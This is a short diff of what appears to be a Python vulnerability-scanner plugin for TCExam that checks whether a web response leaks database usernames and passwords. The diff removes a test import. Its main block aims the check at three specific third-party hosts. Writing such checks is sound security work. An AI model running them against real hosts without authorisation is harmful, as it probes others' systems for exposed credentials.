@@ -16,7 +16,7 @@ def  audit(arg):
     if code==200 and 'db_user' in res and 'db_password' in res:
         security_hole(url)
 if __name__=="__main__":
-    from dummy import *
+
     audit(assign('tcexam','http://210.44.48.41:8080/')[1])
     audit(assign('tcexam','http://www.robotpartner.cn/')[1])
     audit(assign('tcexam','http://61.54.213.12:86/exam/')[1])
